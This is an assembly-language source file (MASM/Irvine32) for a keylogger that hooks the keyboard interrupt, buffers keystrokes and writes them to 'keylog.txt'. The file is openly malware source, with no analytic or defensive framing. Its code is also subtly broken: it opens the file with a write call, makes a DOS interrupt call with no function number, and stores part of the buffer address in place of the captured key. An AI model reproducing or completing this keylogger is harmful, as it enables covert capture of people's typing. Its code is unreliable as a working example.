include Irvine32.inc

.data
    LOG_FILE_PATH db "keylog.txt", 0
    LOG_INTERVAL equ 600
    log_start_message db "Keylogger started at ", 0
    keystroke_buffer db 256 dup(?)  ; Buffer to store keystrokes
    keystroke_count DWORD ?            ; Number of keystrokes in the buffer

.code
main PROC
    ; Open the log file
    mov edx, OFFSET LOG_FILE_PATH
    call WriteToFile
    mov esi, eax ; save file handle

    ; Write the start message
    mov edx, OFFSET log_start_message
    call WriteString
    call WriteDec
    call Crlf

    ; Start keylogging
    mov keystroke_count, 0  ; Initialize keystroke count to 0
    call StartKeylogging

    ; Wait for a key press
    call ReadChar

    ; Stop keylogging
    call StopKeylogging

    ; Write keystrokes to the log file
    mov edx, OFFSET keystroke_buffer
    mov ecx, keystroke_count
    call WriteToFile

    ; Close the file
    mov eax, esi
    call CloseFile

    ; Exit the program
    Invoke ExitProcess, 0
    main ENDP
StartKeylogging PROC
    ; Clear the keystroke buffer
    mov keystroke_count, 0

    ; Set up keyboard interrupt handler
    mov eax, OFFSET HandleKeyboardInterrupt
    mov ebx, OFFSET OldKeyboardInterrupt
    int 21h

    ret
StartKeylogging ENDP

StopKeylogging PROC
    ; Restore original keyboard interrupt handler
    mov eax, OFFSET OldKeyboardInterrupt
    mov ebx, OFFSET HandleKeyboardInterrupt
    int 21h

    ret
StopKeylogging ENDP

HandleKeyboardInterrupt PROC
    ; Check if buffer is full
    cmp keystroke_count, 255
    je BufferFull

    ; Store keystroke in buffer
    mov eax, OFFSET keystroke_buffer
    add eax, keystroke_count
    mov [eax], al
    inc keystroke_count

    ; Call original interrupt handler
    jmp dword ptr [OldKeyboardInterrupt]

BufferFull:
    ; Buffer is full, ignore keystroke and call original interrupt handler
    jmp dword ptr [OldKeyboardInterrupt]
HandleKeyboardInterrupt ENDP

OldKeyboardInterrupt dd ? ; Placeholder for original keyboard interrupt handler

END main
